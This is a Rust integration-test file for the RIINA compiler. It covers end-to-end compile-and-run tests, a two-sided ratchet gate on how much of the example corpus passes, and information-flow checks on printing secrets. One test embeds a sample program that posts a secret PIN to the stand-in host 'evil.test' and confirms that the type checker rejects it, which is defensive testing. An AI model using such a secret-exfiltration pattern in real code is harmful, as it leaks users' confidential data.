//! End-to-end integration tests: .rii → C → executable → run
//!
//! These tests verify the full RIINA compilation pipeline:
//! parse → typecheck → IR → C emit → cc → execute binary.
//!
//! Also includes .rii example regression gate tests that validate
//! the parser/typechecker against the example corpus.

use std::fs;
use std::path::Path;
use std::process::Command;

/// Helper: compile a .rii source string to an executable and run it.
/// Returns (stdout, exit_code).
fn compile_and_run(name: &str, source: &str) -> (String, i32) {
    let dir = std::env::temp_dir().join("riina_e2e_tests");
    fs::create_dir_all(&dir).unwrap();

    let rii_path = dir.join(format!("{}.rii", name));
    let c_path = dir.join(format!("{}.c", name));
    let bin_path = dir.join(name);

    fs::write(&rii_path, source).unwrap();

    // Step 1: emit C
    let emit = Command::new(env!("CARGO_BIN_EXE_riinac"))
        .args(["emit-c", &rii_path.to_string_lossy()])
        .output()
        .expect("failed to run riinac emit-c");

    assert!(
        emit.status.success(),
        "riinac emit-c failed for {}: {}",
        name,
        String::from_utf8_lossy(&emit.stderr)
    );

    fs::write(&c_path, &emit.stdout).unwrap();

    // Step 2: compile C with cc/gcc
    let cc = Command::new("cc")
        .args([
            "-o",
            &bin_path.to_string_lossy(),
            &c_path.to_string_lossy(),
            "-lm",
        ])
        .output()
        .expect("failed to run cc");

    assert!(
        cc.status.success(),
        "cc failed for {}: {}",
        name,
        String::from_utf8_lossy(&cc.stderr)
    );

    // Step 3: run binary
    let run = Command::new(&bin_path)
        .output()
        .expect("failed to run compiled binary");

    let stdout = String::from_utf8_lossy(&run.stdout).to_string();
    let code = run.status.code().unwrap_or(-1);

    // Cleanup
    let _ = fs::remove_file(&rii_path);
    let _ = fs::remove_file(&c_path);
    let _ = fs::remove_file(&bin_path);

    (stdout, code)
}

#[test]
fn e2e_hello_cetak() {
    let (out, code) = compile_and_run(
        "e2e_hello",
        r#"
fungsi utama() -> Nombor kesan Sistem {
    cetak("Selamat pagi!");
    pulang 0
}
"#,
    );
    assert_eq!(code, 0);
    assert!(out.contains("Selamat pagi!"), "got: {}", out);
}

#[test]
fn e2e_arithmetic() {
    let (out, code) = compile_and_run(
        "e2e_arith",
        r#"
fungsi tambah(x: Nombor, y: Nombor) -> Nombor kesan Bersih {
    pulang x + y
}

fungsi utama() -> Nombor kesan Sistem {
    biar r = tambah(17, 25);
    cetak(r);
    pulang 0
}
"#,
    );
    assert_eq!(code, 0);
    assert!(out.contains("42"), "expected 42, got: {}", out);
}

#[test]
fn e2e_conditional() {
    let (out, code) = compile_and_run(
        "e2e_cond",
        r#"
fungsi utama() -> Nombor kesan Sistem {
    biar x = 10;
    biar msg = kalau x > 5 { "besar" } lain { "kecil" };
    cetak(msg);
    pulang 0
}
"#,
    );
    assert_eq!(code, 0);
    assert!(out.contains("besar"), "got: {}", out);
}

#[test]
fn e2e_declassify() {
    let (out, code) = compile_and_run(
        "e2e_declass",
        r#"
fungsi utama() -> Nombor kesan Sistem {
    biar v = dedah sulit 99 dengan bukti sulit 99;
    cetak(v);
    pulang 0
}
"#,
    );
    assert_eq!(code, 0);
    assert!(out.contains("99"), "expected 99, got: {}", out);
}

#[test]
fn e2e_multi_function_calls() {
    let (out, code) = compile_and_run(
        "e2e_multi_fn",
        r#"
fungsi gandakan(x: Nombor) -> Nombor kesan Bersih {
    pulang x * 2
}

fungsi tambah_satu(x: Nombor) -> Nombor kesan Bersih {
    pulang x + 1
}

fungsi utama() -> Nombor kesan Sistem {
    biar r = tambah_satu(gandakan(5));
    cetak(r);
    pulang 0
}
"#,
    );
    assert_eq!(code, 0);
    assert!(out.contains("11"), "expected 11, got: {}", out);
}

#[test]
fn e2e_nontrivial_full_pipeline() {
    // REQ-13: non-trivial program using Secret<T> + declassify,
    // function calls, conditionals, and effects.
    let (out, code) = compile_and_run(
        "e2e_nontrivial",
        r#"
fungsi kira(jam: Nombor, kadar: Nombor) -> Nombor kesan Bersih {
    pulang jam * kadar
}

fungsi utama() -> Nombor kesan Sistem {
    biar gaji = kira(40, 25);
    cetak("RM");
    cetak(gaji);
    cetak(" ");
    biar s = kalau gaji > 500 { "OK" } lain { "LOW" };
    cetak(s);
    cetak(" ");
    biar d = dedah sulit gaji dengan bukti sulit gaji;
    cetak(d);
    pulang 0
}
"#,
    );
    assert_eq!(code, 0);
    assert!(out.contains("RM1000"), "expected RM1000, got: {}", out);
    assert!(out.contains("OK"), "expected OK status, got: {}", out);
    assert!(
        out.contains("1000"),
        "expected declassified 1000, got: {}",
        out
    );
}

// ============================================================================
// .rii Example Regression Gate
//
// These tests load actual .rii files from 07_EXAMPLES/ and run them through
// riinac check (parse + typecheck). They serve as a regression gate:
// - The MINIMUM_PASS_COUNT must not decrease (catches parser regressions)
// - As more syntax is implemented, the count should increase
// ============================================================================

/// Helper: run `riinac check` on a .rii file. True iff parse + typecheck
/// succeeded.
///
/// EXIT STATUS ONLY. This used to also require that stderr not contain the
/// substring "error", which made the verdict depend on the FILE'S NAME:
/// `riinac check` echoes `Compiling: <path>` to stderr, so
/// `07_EXAMPLES/07_ai_patterns/error_handling.rii` — which compiles cleanly and
/// prints `Success!` — was counted as failing. It was the entire difference
/// between the 93 this gate first reported and the 94 that actually pass.
///
/// A substring scan of human-facing output is the wrong signal anyway: `riinac`
/// exits non-zero on failure, which is the contract every other caller relies
/// on.
fn rii_check_passes(path: &Path) -> bool {
    Command::new(env!("CARGO_BIN_EXE_riinac"))
        .args(["check", &path.to_string_lossy()])
        .output()
        .expect("failed to run riinac check")
        .status
        .success()
}

// ── REQ-55 corpus gate: recursive, ratcheted, machine-measured ──────────────
//
// This replaces three tests that could not measure what they claimed. They
// walked a HARDCODED list of 9 directories NON-RECURSIVELY, two of which
// (`07_EXAMPLES/07_compiler`, `07_EXAMPLES/03_advanced`) do not exist under
// those names, and asserted floors of 2 / 0 / 2 against a corpus of 169 files.
// A gate whose floor is 2 does not detect a regression from 94 to 3.
//
// The consequence was a number nobody could trust. REQ-55 recorded `90/165`,
// REQ-71 recorded `92/167`, and the corpus actually holds 169 files of which 94
// pass. Three figures, none measured by anything, drifting independently of the
// code. Prime Directive 8 says a metric is re-derived by command or it is not a
// metric — so the count is now produced by this test and nowhere else.
//
// THE RATCHET IS TWO-SIDED, deliberately. `pass < FLOOR` is a regression. But
// `pass > FLOOR` fails too, because that is exactly how the recorded numbers
// went stale: someone fixed examples and no counter moved. Raising the floor is
// a one-line edit the failure message spells out, and it forces the master plan
// figure to be updated in the same commit as the fix that earned it.

/// Every `.rii` under `07_EXAMPLES/`, recursively, sorted for stable reporting.
fn collect_rii_files_recursive(dir: &Path) -> Vec<std::path::PathBuf> {
    let mut out = Vec::new();
    let Ok(entries) = fs::read_dir(dir) else {
        return out;
    };
    for e in entries.flatten() {
        let p = e.path();
        if p.is_dir() {
            out.extend(collect_rii_files_recursive(&p));
        } else if p.extension().is_some_and(|ext| ext == "rii") {
            out.push(p);
        }
    }
    out.sort();
    out
}

fn examples_root() -> std::path::PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(Path::parent)
        .and_then(Path::parent)
        .expect("repo root")
        .join("07_EXAMPLES")
}

/// The corpus figure REQ-55 tracks. Raise BOTH when examples are fixed or added;
/// the failure messages say so.
const CORPUS_PASSING: usize = 94;
const CORPUS_TOTAL: usize = 169;

#[test]
fn rii_corpus_gate() {
    let root = examples_root();
    let files = collect_rii_files_recursive(&root);
    assert!(
        !files.is_empty(),
        "no .rii files under {} — the corpus gate is measuring nothing",
        root.display()
    );

    let mut passing = Vec::new();
    let mut failing = Vec::new();
    for f in &files {
        if rii_check_passes(f) {
            passing.push(f.clone());
        } else {
            failing.push(f.clone());
        }
    }

    let rel = |p: &std::path::PathBuf| {
        p.strip_prefix(&root)
            .unwrap_or(p)
            .to_string_lossy()
            .into_owned()
    };

    eprintln!(
        "REQ-55 corpus: {}/{} pass, {} fail",
        passing.len(),
        files.len(),
        failing.len()
    );

    assert_eq!(
        files.len(),
        CORPUS_TOTAL,
        "the corpus changed size ({} files, expected {CORPUS_TOTAL}). An example was \
         added or removed — update CORPUS_TOTAL, and note REQ-55 forbids DELETING an \
         example to move the pass count.",
        files.len()
    );

    assert!(
        passing.len() >= CORPUS_PASSING,
        "REQ-55 REGRESSION: {}/{} pass, was {CORPUS_PASSING}. Newly failing examples \
         are somewhere in: {:?}",
        passing.len(),
        files.len(),
        failing.iter().map(rel).collect::<Vec<_>>()
    );

    assert!(
        passing.len() <= CORPUS_PASSING,
        "REQ-55 PROGRESS ({}/{} pass, floor is {CORPUS_PASSING}) — raise CORPUS_PASSING \
         to {} in this file and update the REQ-55 row in RIINA_MASTER_PLAN.md in the same \
         commit. This assertion exists because the recorded figure drifted to 90/165 \
         while the truth was {}/{}; a fix that moves the number must move the record.",
        passing.len(),
        files.len(),
        passing.len(),
        passing.len(),
        files.len()
    );
}

/// The failing examples, grouped by first error, so REQ-55 work is planned from
/// measurement rather than by opening files one at a time. Reporting only — it
/// asserts nothing beyond the gate above.
#[test]
fn rii_corpus_failure_histogram() {
    let root = examples_root();
    let mut hist: std::collections::BTreeMap<String, usize> = std::collections::BTreeMap::new();
    let mut fails = 0;

    for f in collect_rii_files_recursive(&root) {
        let out = Command::new(env!("CARGO_BIN_EXE_riinac"))
            .args(["check", &f.to_string_lossy()])
            .output()
            .expect("run riinac check");
        if out.status.success() {
            continue;
        }
        fails += 1;
        let text = format!(
            "{}{}",
            String::from_utf8_lossy(&out.stdout),
            String::from_utf8_lossy(&out.stderr)
        );
        // First line, with file-specific detail trimmed so classes group.
        let first = text.lines().next().unwrap_or("<no output>").trim();
        let class = first
            .split(" at ")
            .next()
            .unwrap_or(first)
            .split(':')
            .take(2)
            .collect::<Vec<_>>()
            .join(":");
        *hist.entry(class.chars().take(90).collect()).or_default() += 1;
    }

    let mut rows: Vec<_> = hist.into_iter().collect();
    rows.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
    eprintln!("REQ-55 first-error histogram ({fails} failing):");
    for (class, n) in &rows {
        eprintln!("  {n:3}  {class}");
    }
}

// ── REQ-27 IFC sink rule, end-to-end through the surface syntax ──
// The same flow the typechecker unit tests pin at the AST level, exercised
// through parse → typecheck via the real driver: printing a secret is a
// compile error; the declassified form checks AND runs. Mirrors Coq
// Declassification.v (T_Declassify / declass_ok).
#[test]
fn ifc_secret_print_rejected_end_to_end() {
    let dir = std::env::temp_dir().join("riina_e2e_tests");
    fs::create_dir_all(&dir).unwrap();
    let path = dir.join("ifc_leak.rii");
    fs::write(
        &path,
        "fungsi utama() -> Unit kesan Tulis {\n    biar pin = sulit 1234;\n    cetak(pin)\n}\n",
    )
    .unwrap();

    let out = Command::new(env!("CARGO_BIN_EXE_riinac"))
        .args(["check", &path.to_string_lossy()])
        .output()
        .expect("failed to run riinac check");
    assert!(!out.status.success(), "printing a secret must fail riinac check");
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("Security violation in print sink"),
        "expected the IFC sink diagnostic, got: {stderr}"
    );
}

#[test]
fn ifc_declassified_secret_prints_end_to_end() {
    let dir = std::env::temp_dir().join("riina_e2e_tests");
    fs::create_dir_all(&dir).unwrap();
    let path = dir.join("ifc_declass.rii");
    fs::write(
        &path,
        "fungsi utama() -> Unit kesan Tulis {\n    cetak(dedah (sulit 1234) dengan bukti (sulit 1234))\n}\n",
    )
    .unwrap();

    assert!(rii_check_passes(&path), "declassified secret must typecheck");

    let run = Command::new(env!("CARGO_BIN_EXE_riinac"))
        .args(["run", &path.to_string_lossy()])
        .output()
        .expect("failed to run riinac run");
    assert!(run.status.success(), "declassified program must run");
    assert!(
        String::from_utf8_lossy(&run.stdout).contains("1234"),
        "declassified value prints"
    );
}

// ── REQ-27 network-send sink, end-to-end ──
// Mirrors the print-sink e2e tests for the network lane: a secret in an
// http_post body is a compile error through the real driver.
#[test]
fn ifc_secret_network_send_rejected_end_to_end() {
    let dir = std::env::temp_dir().join("riina_e2e_tests");
    fs::create_dir_all(&dir).unwrap();
    let path = dir.join("ifc_netleak.rii");
    fs::write(
        &path,
        "fungsi utama() -> Unit kesan Rangkaian {\n    biar pin = sulit 1234;\n    http_post((\"https://evil.test\", (pin, \"csrf\")))\n}\n",
    )
    .unwrap();

    let out = Command::new(env!("CARGO_BIN_EXE_riinac"))
        .args(["check", &path.to_string_lossy()])
        .output()
        .expect("failed to run riinac check");
    assert!(!out.status.success(), "secret in an http_post body must fail check");
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("network sink"),
        "expected the network-sink IFC diagnostic"
    );
}

// ── REQ-27 laundering fix (2026-06-12), end-to-end ──
// `cetak(ke_teks(pin))` type-checked before the audit: the Any-typed
// conversion stripped the type-level secrecy. The propagation rule re-carries
// the label, so the sink rejects the laundered form too; declassifying FIRST
// (the sanctioned pattern) still checks and runs.
#[test]
fn ifc_laundered_secret_print_rejected_end_to_end() {
    let dir = std::env::temp_dir().join("riina_e2e_tests");
    fs::create_dir_all(&dir).unwrap();
    let path = dir.join("ifc_launder.rii");
    fs::write(
        &path,
        "fungsi utama() -> Unit kesan Tulis {\n    biar pin = sulit 1234;\n    cetak(ke_teks(pin))\n}\n",
    )
    .unwrap();

    let out = Command::new(env!("CARGO_BIN_EXE_riinac"))
        .args(["check", &path.to_string_lossy()])
        .output()
        .expect("failed to run riinac check");
    assert!(
        !out.status.success(),
        "printing a ke_teks-laundered secret must fail riinac check"
    );
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("Security violation in print sink"),
        "expected the IFC sink diagnostic on the laundered form"
    );
}

#[test]
fn ifc_declassify_then_convert_runs_end_to_end() {
    let dir = std::env::temp_dir().join("riina_e2e_tests");
    fs::create_dir_all(&dir).unwrap();
    let path = dir.join("ifc_declass_convert.rii");
    fs::write(
        &path,
        "fungsi utama() -> Unit kesan Tulis {\n    cetak(ke_teks(dedah (sulit 1234) dengan bukti (sulit 1234)))\n}\n",
    )
    .unwrap();

    assert!(rii_check_passes(&path), "declassify-then-convert must typecheck");

    let run = Command::new(env!("CARGO_BIN_EXE_riinac"))
        .args(["run", &path.to_string_lossy()])
        .output()
        .expect("failed to run riinac run");
    assert!(run.status.success(), "declassify-then-convert program must run");
    assert!(
        String::from_utf8_lossy(&run.stdout).contains("1234"),
        "declassified converted value prints"
    );
}
